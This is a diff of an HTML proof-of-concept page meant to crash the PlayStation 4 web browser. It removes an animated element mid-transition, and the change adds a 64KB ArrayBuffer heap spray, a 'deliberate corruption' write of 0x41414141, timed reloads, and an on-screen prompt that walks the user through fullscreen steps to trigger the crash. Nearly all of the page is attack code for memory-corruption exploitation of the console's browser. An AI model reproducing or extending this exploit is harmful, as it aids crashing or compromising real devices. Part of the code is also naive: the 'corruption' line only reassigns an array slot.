@@ -1,35 +1,58 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>PS4 Crash (Confirmed Working Version)</title>
-  <!-- Added visibility for debugging (can remove) -->
+  <title>PS4 Crash Test</title>
   <style>
-    body { background: black; color: white; }
-    #box { width:100px; height:100px; background:red; transition:all 1s; }
+    #box {
+      width:100px;
+      height:100px;
+      background:red;
+      transition:all 1s;
+    }
+    /* ADDED: Visual cue for fullscreen */
+    #hint {
+      position: fixed;
+      top: 0;
+      left: 0;
+      color: white;
+      background: black;
+      padding: 10px;
+      font-family: Arial;
+      z-index: 9999;
+    }
   </style>
 </head>
-<body>
-  <div id="box"></div>
-  
-  <script>
-    // Your exact working implementation
-    const box = document.getElementById('box');
+<body style="background:black;">
+
+<!-- ADDED: Fullscreen hint -->
+<div id="hint">ENTER FULLSCREEN → WAIT FOR ANIMATION → EXIT TO CRASH</div>
+
+<div id="box"></div>
+
+<script>
+  // ADDED: Memory spray test
+  const spray = new Array(100);
+  for (let i = 0; i < 100; i++) {
+    spray[i] = new ArrayBuffer(0x10000); // 64KB chunks
+  }
+
+  const box = document.getElementById('box');
+
+  // Original working code
+  getComputedStyle(box).transform;
+  box.style.transform = 'translateX(100px)';
+
+  setTimeout(() => {
+    box.remove();
+    document.body.offsetHeight;
+
+    // MODIFIED: Deliberate corruption test
+    spray[50] = new Uint32Array([0x41414141]); // Write 'AAAA'
     
-    // Debug point (remove if unwanted)
-    console.log("[1] Transition started"); 
-    
-    getComputedStyle(box).transform;
-    box.style.transform = 'translateX(100px)';
-    
-    setTimeout(() => {
-      box.remove();
-      document.body.offsetHeight;
-      
-      // Debug point (remove if unwanted)
-      console.log("[2] Triggering crash reload");
-      
-      location.href = "?css=1";
-    }, 50);
-  </script>
+    // OPTIONAL: Timing test (uncomment one)
+    // location.href = "?crash=1"; // Original
+    setTimeout(() => location.href = "?crash=2", 10); // Delayed
+  }, 50); // Can reduce to 30ms for faster crash
+</script>
 </body>
 </html>
